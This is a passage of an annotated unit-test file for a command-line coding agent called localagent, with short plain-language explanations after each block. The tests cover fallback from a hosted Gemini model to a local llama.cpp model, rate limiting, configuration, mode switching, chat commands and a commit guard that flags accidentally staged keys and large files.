+490 |         backend = FallbackBackend(entries, 3, sleep=lambda _s: None, on_notice=notices.append,
+491 |                                   probe=probe, clock=clock or time.monotonic)
+492 |         return backend, notices
+493 | 
+```
+- A chain of one rate-limited ("hosted") model and optionally a local one, with an injectable probe and clock.
+
+```python
+494 |     def test_no_internet_goes_straight_to_the_local_model_and_back(self):
+495 |         now = [1000.0]
+496 |         hosted = ScriptedBackend([LLMError("no name", dns=True), reply("online again")])
+497 |         local = ScriptedBackend([reply("local 1"), reply("local 2"), reply("local 3")])
+498 |         up = [False]
+499 |         backend, notices = self.chain(hosted, local, probe=lambda: up[0], clock=lambda: now[0])
+500 |         self.assertEqual(backend.chat([], []).message["content"], "local 1")
+501 |         self.assertEqual(hosted.calls, 1)                           # a name failure: no retries
+502 |         self.assertTrue(backend.offline and any("unreachable" in n for n in notices))
+503 |         self.assertEqual(backend.chat([], []).message["content"], "local 2")
+504 |         self.assertEqual(hosted.calls, 1)                           # skipped while offline
+505 |         now[0] += 120                                               # cool-down over, still down
+506 |         self.assertEqual(backend.chat([], []).message["content"], "local 3")
+507 |         self.assertEqual(hosted.calls, 1)
+508 |         now[0] += 120
+509 |         up[0] = True                                                # the internet is back
+510 |         self.assertEqual(backend.chat([], []).message["content"], "online again")
+511 |         self.assertFalse(backend.offline)
+512 |         self.assertTrue(any("back online" in n for n in notices))
+513 | 
+```
+- The whole cycle with a fake clock: a name-lookup failure is not retried, the local model answers, and an "unreachable"
+  notice appears; the next call skips the hosted model entirely; after the cool-down, with the probe still failing, it
+  is skipped again (no request sent); when the probe succeeds the hosted model answers and "back online" is announced.
+
+```python
+514 |     def test_a_repeated_network_error_also_means_offline(self):
+515 |         hosted = ScriptedBackend([LLMError("reset"), LLMError("reset")])
+516 |         backend, _ = self.chain(hosted, ScriptedBackend([reply("local")]))
+517 |         self.assertEqual(backend.chat([], []).message["content"], "local")
+518 |         self.assertEqual(hosted.calls, 2)                           # one retry, then offline
+519 | 
+```
+```python
+520 |     def test_without_a_local_model_the_error_says_what_to_do(self):
+521 |         backend, _ = self.chain(ScriptedBackend([LLMError("no name", dns=True)]))
+522 |         with self.assertRaises(LLMError) as caught:
+523 |             backend.chat([], [])
+524 |         self.assertIn(OFFLINE_HELP, str(caught.exception))
+525 | 
+```
+```python
+526 |     def test_a_final_error_is_not_retried(self):
+527 |         hosted = ScriptedBackend([LLMError("no name", dns=True)])
+528 |         local = ScriptedBackend([LLMError("no local model", final=True)])
+529 |         backend, _ = self.chain(hosted, local)
+530 |         with self.assertRaisesRegex(LLMError, "no local model"):
+531 |             backend.chat([], [])
+532 |         self.assertEqual(local.calls, 1)
+533 | 
+534 | 
+```
+- Two network errors (no name failure) mean offline after one retry. Without a local model the error starts with
+  `OFFLINE_HELP`. A `final` error from the local model is not retried (one call).
+
+## Rate limiter, configuration
+```python
+535 | class LimiterTests(unittest.TestCase):
+```
+```python
+536 |     def test_pacific_time_without_time_zone_data(self):
+537 |         def utc(*parts):
+538 |             return datetime(*parts, tzinfo=timezone.utc)
+539 |         self.assertEqual(_pacific_offset(utc(2026, 3, 8, 9, 59)).total_seconds(), -8 * 3600)
+540 |         self.assertEqual(_pacific_offset(utc(2026, 3, 8, 10, 0)).total_seconds(), -7 * 3600)
+541 |         self.assertEqual(_pacific_offset(utc(2026, 11, 1, 8, 59)).total_seconds(), -7 * 3600)
+542 |         self.assertEqual(_pacific_offset(utc(2026, 11, 1, 9, 0)).total_seconds(), -8 * 3600)
+543 |         july = utc(2026, 7, 2, 6, 30).timestamp()                   # 23:30 on 1 July in California
+544 |         with mock.patch.dict(sys.modules, {"zoneinfo": None}):      # as on Windows
+545 |             self.assertEqual(pacific_day(july), "2026-07-01")
+546 | 
+```
+```python
+547 |     def test_one_shared_limiter_per_model_and_long_waits_are_announced(self):
+548 |         with tempfile.TemporaryDirectory() as tmp:
+549 |             usage = Path(tmp) / "usage.json"
+550 |             first = shared_limiter("m", 5, 1000, 50, usage)
+551 |             self.assertIs(shared_limiter("m", 5, 1000, 50, usage), first)
+552 |             heard: list[str] = []
+553 |             clock = [0.0]
+554 |             limiter = RateLimiter("w", 1, 10_000, 100, usage, clock=lambda: clock[0],
+555 |                                   sleep=lambda s: clock.__setitem__(0, clock[0] + s),
+556 |                                   on_wait=heard.append)
+557 |             limiter.before_call(10)
+558 |             limiter.before_call(10)                                 # must wait about 60 s
+559 |             self.assertTrue(heard and "per-minute limit" in heard[0])
+560 |             self.assertEqual([p.name for p in Path(tmp).iterdir()], ["usage.json"])   # no leftovers
+561 | 
+562 | 
+```
+- The daylight-saving switches of 2026 to the minute (8 March 10:00 UTC, 1 November 09:00 UTC); and with `zoneinfo`
+  made unavailable (as on Windows), 23:30 on 1 July in California is still 1 July (the old fallback said 2 July).
+- The same model and limits give the same limiter object. A limiter of 1 request per minute announces the wait for
+  the second request; the usage folder holds only `usage.json` afterwards (no temporary files left).
+
+```python
+563 | class ConfigTests(unittest.TestCase):
+```
+```python
+564 |     def test_bad_values_are_explained(self):
+565 |         with mock.patch.dict(os.environ, {"LOCALAGENT_NUM_CTX": "8k"}):
+566 |             with self.assertRaisesRegex(ValueError, "LOCALAGENT_NUM_CTX must be a whole number"):
+567 |                 Config.from_env()
+568 |         with mock.patch.dict(os.environ, {"LOCALAGENT_MODE": "sometimes"}):
+569 |             with self.assertRaisesRegex(ValueError, "LOCALAGENT_MODE"):
+570 |                 Config.from_env()
+571 |         with mock.patch.dict(os.environ, {"LOCALAGENT_MODE": "OFFLINE", "LOCALAGENT_GPU_LAYERS": "9"}):
+572 |             config = Config.from_env()
+573 |         self.assertEqual((config.mode, config.gpu_layers), ("offline", 9))
+574 | 
+575 | 
+```
+- `LOCALAGENT_NUM_CTX=8k` and an unknown `LOCALAGENT_MODE` raise explanations naming the variable; `OFFLINE` in capitals
+  and `LOCALAGENT_GPU_LAYERS=9` are read correctly.
+
+## The local model server
+```python
+576 | class LocalServerTests(unittest.TestCase):
+```
+```python
+577 |     def test_files_are_found_where_they_are_expected(self):
+578 |         with tempfile.TemporaryDirectory() as tmp:
+579 |             home = Path(tmp)
+580 |             (home / "models").mkdir()
+581 |             (home / "models" / "mmproj-x.gguf").write_text("", encoding="utf-8")
+582 |             (home / "models" / "small.gguf").write_text("", encoding="utf-8")
+583 |             with mock.patch.object(localserver, "HOME", home), \
+584 |                     mock.patch.object(localserver, "CHECKOUT", home / "none"):
+585 |                 found = localserver.find_model_file(Config())
+586 |                 self.assertEqual(found.name if found else "", "small.gguf")   # never mmproj
+587 |                 self.assertIsNone(localserver.find_llama_server(replace(Config(), llama_server="")))
+588 |                 given = home / "models" / "small.gguf"
+589 |                 self.assertEqual(localserver.find_model_file(replace(Config(), model_file=str(given))),
+590 |                                  given)
+591 | 
+```
+```python
+592 |     def test_command_line_and_where_a_server_may_be_started(self):
+593 |         server = LlamaServer(Path("llama-server"), Path("m.gguf"), "http://127.0.0.1:8123/v1", 4096)
+594 |         argv = server.argv()
+595 |         self.assertIn("--port", argv)
+596 |         self.assertEqual(argv[argv.index("--port") + 1], "8123")
+597 |         self.assertNotIn("-ngl", argv)                              # llama.cpp fits the GPU
+598 |         self.assertIn("-ngl", LlamaServer(Path("x"), Path("m.gguf"), "http://127.0.0.1:1/v1",
+599 |                                           4096, gpu_layers=9).argv())
+600 |         with mock.patch.object(localserver, "find_llama_server", return_value=Path("x")), \
+601 |                 mock.patch.object(localserver, "find_model_file", return_value=Path("m.gguf")):
+602 |             self.assertTrue(localserver.can_start(Config()))
+603 |             self.assertFalse(localserver.can_start(replace(Config(), api_base="http://gpu-box:8000/v1")))
+604 | 
+```
+- With `HOME` pointed at a temporary folder: the model file is found and `mmproj-*.gguf` never chosen; no server
+  program means none is found; an explicit model path wins.
+- The command line carries the port from the address, and `-ngl` only when GPU layers were set. A server may be
+  started for `127.0.0.1` but not for a remote address.
+
+```python
+605 |     def test_a_running_server_is_used_and_the_history_fitted(self):
+606 |         body = json.dumps({"choices": [{"message": {"content": "hi from local"}}]}).encode()
+607 |         server = FakeServer(200, body)
+608 |         self.addCleanup(server.close)
+609 |         config = replace(Config(), api_base=server.url, stream=False, local_ctx=2000)
+610 |         model = LocalModel(config)
+611 |         history = [{"role": "system", "content": "s"}] + [
+612 |             {"role": "user", "content": f"q{i} " + "w" * 3000} for i in range(4)]
+613 |         self.assertEqual(model.chat(history, []).message["content"], "hi from local")
+614 |         sent = server.received[-1]["messages"]
+615 |         self.assertLess(len(json.dumps(sent)), len(json.dumps(history)))   # shortened to fit
+616 |         self.assertTrue(model.last_model.startswith("local:"))
+617 | 
+```
+```python
+618 |     def test_nothing_local_is_a_final_error(self):
+619 |         config = replace(Config(), api_base="http://127.0.0.1:9/v1", host="http://127.0.0.1:9")
+620 |         with mock.patch.object(localserver, "can_start", return_value=False):
+621 |             with self.assertRaises(LLMError) as caught:
+622 |                 LocalModel(config).chat([], [])
+623 |         self.assertTrue(caught.exception.final)
+624 |         self.assertIn("No local model", str(caught.exception))
+625 | 
+```
+- With a fake OpenAI-style server running, the local model answers through it, and a conversation four times too big
+  for a 2 000-token window reaches the server shortened.
+- With nothing running and nothing to start, the error is `final` and says "No local model".
+
+```python
+626 |     def test_llama_server_is_started_waited_for_and_stopped(self):
+627 |         # a stopped process (or a virus scanner) may hold the log open for a moment on Windows
+628 |         with tempfile.TemporaryDirectory(ignore_cleanup_errors=True) as tmp:
+629 |             script = Path(tmp) / "fake_llama.py"
+630 |             script.write_text(FAKE_LLAMA, encoding="utf-8")
+631 |             port = free_port()
+632 |             base = f"http://127.0.0.1:{port}/v1"
+633 |             server = LlamaServer(Path(sys.executable), Path(tmp) / "tiny.gguf", base, 2048)
+634 |             server.argv = lambda: [sys.executable, str(script), "--port", str(port)]  # type: ignore
+635 |             notices: list[str] = []
+636 |             config = replace(Config(), api_base=base, host="http://127.0.0.1:9", stream=False)
+637 |             with mock.patch.object(localserver, "LOG_FILE", Path(tmp) / "server.log"), \
+638 |                     mock.patch.object(localserver, "can_start", return_value=True), \
+639 |                     mock.patch.object(localserver, "server_for", return_value=server):
+640 |                 model = LocalModel(config, on_notice=notices.append)
+641 |                 try:
+642 |                     self.assertEqual(model.chat([{"role": "user", "content": "hi"}], [])
+643 |                                      .message["content"], "local hello")
+644 |                     self.assertTrue(server.running())
+645 |                     self.assertTrue(any("starting the local model" in n for n in notices))
+646 |                     self.assertTrue(any("ready" in n for n in notices))
+647 |                 finally:
+648 |                     server.stop()
+649 |             self.assertFalse(server.running())
+650 | 
+651 | 
+```
+- **The real start-up, with the fake server program:** `LocalModel` finds nothing running, starts the program (its
+  command line replaced by the fake), waits through the "loading" answers until `/health` says 200, answers "local
+  hello", reports "starting" and "ready", and the process is stopped afterwards. (The real `llama-server.exe` was also
+  checked separately — see `localserver.md`.)
+
+## Modes and the chat
+```python
+652 | class ModeTests(unittest.TestCase):
+```
+```python
+653 |     def choose(self, mode, key="", local="", fallback=""):
+654 |         found = {"openai": (True, False, False), "ollama": (False, True, False),
+655 |                  "local": (False, False, True), "": (False, False, False)}[local]
+656 |         with mock.patch.object(cli, "server_up", return_value=found[0]), \
+657 |                 mock.patch.object(cli, "ollama_up", return_value=found[1]), \
+658 |                 mock.patch.object(cli, "can_start", return_value=found[2]), \
+659 |                 mock.patch.object(cli, "describe_local", return_value="a local model"):
+660 |             return cli.choose_mode(replace(Config(), gemini_api_key=key, fallback_backend=fallback),
+661 |                                    mode)
+662 | 
+```
+- Runs `choose_mode` with a key or not and a chosen kind of local model (the three detection functions replaced by
+  mocks, `describe_local` by a fixed text).
+
+```python
+663 |     def test_each_mode_chooses_its_models(self):
+664 |         config, notes = self.choose("online", key="k", local="local")
+665 |         self.assertEqual((config.backend, config.fallback_backend), ("gemini", ""))
+666 |         config, notes = self.choose("auto", key="k", local="local")
+667 |         self.assertEqual((config.backend, config.fallback_backend), ("gemini", "local"))
+668 |         self.assertTrue(any("offline backup: a local model" in n for n in notes))
+669 |         config, _ = self.choose("auto", key="k", local="ollama")
+670 |         self.assertEqual(config.fallback_backend, "ollama")
+671 |         config, notes = self.choose("auto", local="openai")
+672 |         self.assertEqual((config.backend, config.num_ctx), ("local", 8192))
+673 |         self.assertIn("no GEMINI_API_KEY", notes[0])
+674 |         config, _ = self.choose("offline", key="k", local="local")
+675 |         self.assertEqual((config.backend, config.mode), ("local", "offline"))
+676 | 
+```
+```python
+677 |     def test_impossible_modes_say_what_to_do(self):
+678 |         with self.assertRaisesRegex(ValueError, "online mode needs a Gemini key"):
+679 |             self.choose("online")
+680 |         with self.assertRaisesRegex(ValueError, "No local model"):
+681 |             self.choose("offline", key="k")
+682 |         with self.assertRaisesRegex(ValueError, "No model is available yet"):
+683 |             self.choose("auto")
+684 |         with self.assertRaisesRegex(ValueError, "unknown mode"):
+685 |             self.choose("sometimes", key="k")
+686 | 
+```
+- Online: Gemini, no backup. Auto with a key: Gemini plus the local backup (or Ollama). Auto without a key: the local
+  model with an 8K budget and a note saying why. Offline: the local model even with a key.
+- Online without a key, offline without a local model, auto with nothing, and an unknown mode each raise an
+  explanation.
+
+```python
+687 |     def test_backends_for_the_modes(self):
+688 |         self.assertIsInstance(make_backend(replace(Config(), backend="local")), LocalModel)
+689 |         chain = make_gemini(replace(Config(), gemini_api_key="k", gemini_models=("m1",),
+690 |                                     gemini_strong_models=(), fallback_backend="local"))
+691 |         last = chain._entries[-1]
+692 |         self.assertEqual(last.name, "local")
+693 |         self.assertIsInstance(last.backend, LocalModel)
+694 |         self.assertIsNotNone(chain._probe)
+695 |         with mock.patch.object(cli, "find_model_file", return_value=Path("Qwen3-8B.gguf")):
+696 |             self.assertEqual(cli.model_label(replace(Config(), backend="local")), "local:Qwen3-8B")
+697 |             self.assertTrue(cli.model_label(replace(Config(), backend="gemini", gemini_models=("m",),
+698 |                             gemini_strong_models=(), fallback_backend="local")).endswith("> local:Qwen3-8B"))
+699 | 
+```
+```python
+700 |     def test_flags(self):
+701 |         parser = cli.build_parser()
+702 |         self.assertEqual(parser.parse_args(["--offline"]).mode, "offline")
+703 |         self.assertEqual(parser.parse_args(["--online"]).mode, "online")
+704 |         self.assertEqual(parser.parse_args(["--mode", "auto"]).mode, "auto")
+705 |         self.assertEqual(parser.parse_args(["-p", "hi"]).prompt, "hi")
+706 |         self.assertTrue(parser.parse_args(["-c"]).resume)
+707 |         with contextlib.redirect_stdout(io.StringIO()) as out, self.assertRaises(SystemExit):
+708 |             parser.parse_args(["--version"])
+709 |         self.assertIn("localagent 0.", out.getvalue())
+710 | 
+711 | 
+```
+- `local` builds a `LocalModel`; a Gemini chain with a `local` fallback ends with a `LocalModel` and has a probe; labels
+  name the local model by its file.
+- `--offline`, `--online`, `--mode`, `-p` and `-c` set what they should; `--version` prints the version.
+
+```python
+712 | class ChatTests(unittest.TestCase):
+```
+```python
+713 |     def chat(self, tmp, script, **kw):
+714 |         cfg = replace(Config(), workspace=Path(tmp), auto_format=False, **kw)
+715 |         tools = ToolBox(cfg, lambda _q: True, {"permissions": {"allow": ["run_tests"], "deny": []}})
+716 |         args = cli.build_parser().parse_args([])
+717 |         with contextlib.redirect_stdout(io.StringIO()):
+718 |             return cli.Chat(cfg, args, FakeBackend(script), tools, Meter())
+719 | 
+```
+```python
+720 |     def say(self, chat, text) -> str:
+721 |         with contextlib.redirect_stdout(io.StringIO()) as out:
+722 |             self.assertTrue(chat.command(text))
+723 |         return out.getvalue()
+724 | 
+```
+- `chat` builds a `Chat` with a scripted model (and `run_tests` allowed); `say` types one line and returns what was
+  printed.
+
+```python
+725 |     def test_bang_runs_a_command_and_its_output_goes_with_the_next_request(self):
+726 |         with tempfile.TemporaryDirectory() as tmp:
+727 |             chat = self.chat(tmp, [{"role": "assistant", "content": "seen"}])
+728 |             self.assertIn("hello-from-shell", self.say(chat, "!echo hello-from-shell"))
+729 |             self.assertEqual(chat.meter.calls, 0)                   # no model call
+730 |             self.say(chat, "what did it print?")
+731 |             sent = [m["content"] for m in chat.agent.messages if m["role"] == "user"][-1]
+732 |             self.assertIn("hello-from-shell", sent)
+733 |             self.assertIn("My request: what did it print?", sent)
+734 | 
+```
+```python
+735 |     def test_hash_saves_a_note_and_at_attaches_a_file(self):
+736 |         with tempfile.TemporaryDirectory() as tmp:
+737 |             (Path(tmp) / "AGENT.md").write_text("# Notes for agents\n\n## Notes\n- old\n\n## Other\nx\n",
+738 |                                                 encoding="utf-8")
+739 |             (Path(tmp) / "app.py").write_text("print('APP')\n", encoding="utf-8")
+740 |             chat = self.chat(tmp, [{"role": "assistant", "content": "ok"}])
+741 |             self.say(chat, "# always use type hints")
+742 |             notes = (Path(tmp) / "AGENT.md").read_text(encoding="utf-8")
+743 |             self.assertIn("- old\n- always use type hints\n\n## Other", notes)
+744 |             self.assertIn("always use type hints", chat.agent.messages[0]["content"])   # reloaded
+745 |             self.assertIn("[attached: app.py]", self.say(chat, "explain @app.py, mail me@example.com"))
+746 |             self.assertIn("print('APP')", chat.agent.messages[-2]["content"])
+747 | 
+```
+```python
+748 |     def test_attachments_respect_the_size_limit(self):
+749 |         with tempfile.TemporaryDirectory() as tmp:
+750 |             (Path(tmp) / "big.txt").write_text("b" * 500, encoding="utf-8")
+751 |             text, attached = cli.attach_files("see @big.txt and @missing.py", Path(tmp), 100)
+752 |             self.assertEqual((text, attached), ("see @big.txt and @missing.py", []))
+753 |             text, attached = cli.attach_files("see @big.txt.", Path(tmp), 1000)
+754 |             self.assertEqual(attached, ["big.txt"])
+755 | 
+```
+- `!echo hello-from-shell` prints the output with no model call; the next request carries it, followed by "My
+  request: ...".
+- `# always use type hints` lands under `## Notes`, before the next section, and is in the system prompt at once.
+  `@app.py` attaches the file (and `me@example.com` is ignored).
+- A file bigger than the limit, and a missing file, are not attached; trailing punctuation after `@big.txt.` is ignored.
+
+```python
+756 |     def test_model_status_and_switching(self):
+757 |         with tempfile.TemporaryDirectory() as tmp:
+758 |             chat = self.chat(tmp, [])
+759 |             with mock.patch.object(cli, "describe_local", return_value="LOCAL THING"):
+760 |                 status = self.say(chat, "/model")
+761 |             self.assertIn("mode: auto", status)
+762 |             self.assertIn("offline: LOCAL THING", status)
+763 |             offline = replace(chat.config, backend="local", mode="offline", num_ctx=8192)
+764 |             new_backend = FakeBackend([])
+765 |             with mock.patch.object(cli, "choose_mode", return_value=(offline, ["note"])), \
+766 |                     mock.patch.object(cli, "make_backend", return_value=new_backend):
+767 |                 said = self.say(chat, "/offline")
+768 |             self.assertIn("[now offline", said)
+769 |             self.assertIs(chat.agent.backend, new_backend)
+770 |             self.assertEqual(chat.config.mode, "offline")
+771 |             with mock.patch.object(cli, "choose_mode", side_effect=ValueError("no key")):
+772 |                 self.assertIn("cannot switch to online: no key", self.say(chat, "/model online"))
+773 |             self.assertIs(chat.agent.backend, new_backend)          # unchanged after a failure
+774 | 
+```
+```python
+775 |     def test_clear_resume_permissions_and_unknown_commands(self):
+776 |         with tempfile.TemporaryDirectory() as tmp:
+777 |             chat = self.chat(tmp, [{"role": "assistant", "content": "a"}])
+778 |             self.say(chat, "remember the blue door")
+779 |             self.assertIn("conversation cleared", self.say(chat, "/clear"))
+780 |             self.assertEqual(len(chat.agent.messages), 1)
+781 |             listing = self.say(chat, "/resume")
+782 |             self.assertIn("remember the blue door", listing)
+783 |             self.assertIn("(this conversation)", listing)
+784 |             self.assertIn("allow: run_tests", self.say(chat, "/permissions"))
+785 |             self.assertIn("unknown command /nope", self.say(chat, "/nope"))
+786 |             with contextlib.redirect_stdout(io.StringIO()):
+787 |                 self.assertFalse(chat.command("/exit"))
+788 | 
+```
+- `/model` shows the mode and the offline model. `/offline` (with the mode choice and backend mocked) switches the agent
+  to the new backend and mode. A failing switch (`no key`) is reported and changes nothing.
+- `/clear` empties the conversation; `/resume` lists it (marked as this conversation); `/permissions` shows the rules;
+  an unknown command says so; `/exit` quits.
+
+```python
+789 |     def test_print_mode_answers_once(self):
+790 |         with tempfile.TemporaryDirectory() as tmp:
+791 |             cfg = replace(Config(), workspace=Path(tmp))
+792 |             tools = ToolBox(cfg, cli.refuse)
+793 |             script = [tool_call("run_tests"), {"role": "assistant", "content": "the answer"}]
+794 |             with contextlib.redirect_stdout(io.StringIO()) as out, \
+795 |                     contextlib.redirect_stderr(io.StringIO()) as err:
+796 |                 code = cli.run_once(cfg, FakeBackend(script), tools, Meter(), "question")
+797 |             self.assertEqual((code, out.getvalue().strip()), (0, "the answer"))
+798 |             self.assertIn("refused", err.getvalue())                # nobody to ask: refused
+799 | 
+```
+```python
+800 |     def test_prompts_without_a_keyboard_mean_no(self):
+801 |         def gone(_prompt):
+802 |             raise EOFError
+803 |         self.assertFalse(cli.Approver(read=gone)("run x"))
+804 |         with contextlib.redirect_stdout(io.StringIO()):
+805 |             self.assertFalse(cli.confirm("go? ", read=gone))
+806 | 
+```
+```python
+807 |     def test_colours_only_where_wanted(self):
+808 |         with contextlib.redirect_stdout(io.StringIO()) as out:
+809 |             cli.make_printer(True)("     +added")
+810 |             cli.make_printer(False)("     -removed")
+811 |         self.assertEqual(out.getvalue(), "\033[32m     +added\033[0m\n     -removed\n")
+812 |         with mock.patch.dict(os.environ, {"NO_COLOR": "1"}):
+813 |             self.assertFalse(cli.use_color())
+814 | 
+```
+```python
+815 |     def test_overview_summarises_crowded_folders(self):
+816 |         with tempfile.TemporaryDirectory() as tmp:
+817 |             root = Path(tmp)
+818 |             for i in range(30):
+819 |                 (root / "bin").mkdir(exist_ok=True)
+820 |                 (root / "bin" / f"lib{i}.dll").write_bytes(b"x")
+821 |             (root / "src").mkdir()
+822 |             for name in ("main.py", "util.py"):
+823 |                 (root / "src" / name).write_text("x", encoding="utf-8")
+824 |             (root / "README.md").write_text("x", encoding="utf-8")
+825 |             tree = project_tree(root, 6).splitlines()
+826 |             self.assertEqual(tree, ["README.md", "bin/ (30 files: 30 .dll)", "src/main.py",
+827 |                                     "src/util.py"])
+828 | 
+829 | 
+```
+- `-p`: the answer alone on standard output, exit code 0, and a `run_tests` the model asked for is refused (nobody to ask).
+- An approval or a confirmation with no input means no.
+- With colours an added diff line is green; without, plain; `NO_COLOR` switches colours off.
+- 30 DLLs, two source files and a README in 6 lines: the README, one summary line for `bin/`, both source files.
+
+## The commit guard
+```python
+830 | class CommitGuardTests(unittest.TestCase):
+```
+```python
+831 |     def test_problems_in_staged_files(self):
+832 |         key = b"AIza" + b"x" * 35                                   # built here: never in the source
+833 |         self.assertEqual(check_commit.problems("ok.py", 10, lambda: b"print(1)"), [])
+834 |         self.assertIn("Google API key", check_commit.problems("cfg.py", 50, lambda: key)[0])
+835 |         self.assertIn("must never be committed", check_commit.problems(".env", 5, lambda: b"")[0])
+836 |         self.assertEqual(check_commit.problems(".env.example", 5, lambda: b"KEY="), [])
+837 |         big = check_commit.problems("models/m.gguf", 5_000_000_000, lambda: b"")
+838 |         self.assertEqual(len(big), 2)                               # a model file, and too big
+839 |         self.assertIn("too big", big[1])
+840 | 
+```
+```python
+841 |     def test_only_a_private_author_address_passes(self):
+842 |         self.assertIsNone(check_commit.author_problem(
+843 |             "A <1+a@users.noreply.github.com> 1700000000 +0000"))
+844 |         self.assertIn("would be public", check_commit.author_problem("A <a@gmail.com> 1 +0000"))
+845 | 
+846 | 
+```
+- A clean file passes; a fake Google key (built at run time) is found; `.env` is refused but `.env.example` is fine; a
+  5 GB model file gets two problems (its kind and its size) without being read.
+- A noreply author passes; a Gmail author gets the explanation.
+
+```python
+847 | if __name__ == "__main__":
+848 |     unittest.main()
+```
+- Lets you run the file directly.
